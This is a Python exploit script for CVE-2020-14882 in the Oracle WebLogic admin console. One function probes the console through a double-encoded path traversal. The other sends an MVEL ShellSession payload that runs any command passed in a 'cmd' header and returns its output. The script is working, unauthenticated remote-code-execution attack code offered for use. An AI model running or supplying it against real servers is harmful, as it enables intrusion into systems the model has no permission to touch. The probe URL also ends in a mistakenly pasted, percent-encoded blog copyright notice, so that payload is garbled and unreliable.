# -*- coding: utf-8 -*-


import http.client
import requests
import sys
http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def exp_check(url):
    payload = "/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=AppDeploymentsControlPage&handle=com.bea.console.handles.JMXHandle%28%22com.bea%3AName%3Dbase_domain%2CType%3DDomain%22%29%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E7%89%88%E6%9D%83%E5%A3%B0%E6%98%8E%EF%BC%9A%E6%9C%AC%E6%96%87%E4%B8%BACSDN%E5%8D%9A%E4%B8%BB%E3%80%8CCrazy_Yu8%E3%80%8D%E7%9A%84%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0%EF%BC%8C%E9%81%B5%E5%BE%AACC%204.0%20BY-SA%E7%89%88%E6%9D%83%E5%8D%8F%E8%AE%AE%EF%BC%8C%E8%BD%AC%E8%BD%BD%E8%AF%B7%E9%99%84%E4%B8%8A%E5%8E%9F%E6%96%87%E5%87%BA%E5%A4%84%E9%93%BE%E6%8E%A5%E5%8F%8A%E6%9C%AC%E5%A3%B0%E6%98%8E%E3%80%82%E5%8E%9F%E6%96%87%E9%93%BE%E6%8E%A5%EF%BC%"
    headers = {
        'User-Agent':'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Content-Type':'application/x-www-form-urlencoded'
    }

    try:
        r = requests.get(url + payload, headers=headers, timeout=10, verify=False)
        if r.status_code == 200:
            return 1
        return 2
    except:
        return 3

def exp_cmd(url, cmd):
    payload_cve_2020_14882_v12 = ('_nfpb=true&_pageLabel=&handle='
                                  'com.tangosol.coherence.mvel2.sh.ShellSession("weblogic.work.ExecuteThread executeThread = '
                                  '(weblogic.work.ExecuteThread) Thread.currentThread(); weblogic.work.WorkAdapter adapter = '
                                  'executeThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField'
                                  '("connectionHandler"); field.setAccessible(true); Object obj = field.get(adapter); weblogic.servlet'
                                  '.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) '
                                  'obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("cmd"); '
                                  'String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]'
                                  '{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd}; if (cmd != null) { String result '
                                  '= new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter'
                                  '("\\\\A").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.'
                                  'ServletResponseImpl) req.getClass().getMethod("getResponse").invoke(req);'
                                  'res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));'
                                  'res.getServletOutputStream().flush(); res.getWriter().write(""); }executeThread.interrupt(); ");')

    payload = payload_cve_2020_14882_v12
    path = "/console/css/%252e%252e%252fconsole.portal"
    headers = {
        'User-Agent':'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Content-Type':'application/x-www-form-urlencoded',
        'cmd': cmd
    }
    try:
        r = requests.post(url + path, data=payload, headers=headers, timeout=10, verify=False)
        #print(r.text)
        return r.text
    except:
        return 3

if __name__ == '__main__':
    pass
    # url = sys.argv[1]
    # cmd=sys.argv[2]

    # exp_cmd(url,cmd)
